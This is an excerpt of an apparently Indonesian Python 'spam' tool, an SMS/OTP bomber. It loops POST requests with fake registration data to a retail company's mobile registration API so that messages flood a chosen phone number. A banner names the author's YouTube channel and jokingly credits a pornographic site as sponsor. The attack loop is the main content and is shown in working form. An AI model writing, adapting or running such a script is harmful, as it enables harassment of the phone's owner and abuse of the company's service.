...
banner = """
•====================================•
Gunakan Dengan Bijak Cokk!!!
Youtube:Rio coks
Tools Ini Di Dponsori Oleh Xnxx.com
•====================================•
"""
print (banner)
...
data = {'emailAddress': 'mamens@mail.com',
           'firstName': 'mamens',
           'lastName': 'Gans',
           'mobileNumber': no,
           'mccCardNumber': '',
...
print("\n[DISPONSORI OLEH XNXX.COM]")
for i in range(jml):
      sec = requests.post('https://thor.matahari.com/MatahariMobileAPI/register', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. Gagal Spam Silahkan Coba Lagi{no}')
      else:
           print(f'{i+1}. Berhasil Spam Ke Nomer {no}')
      time.sleep(1.5)
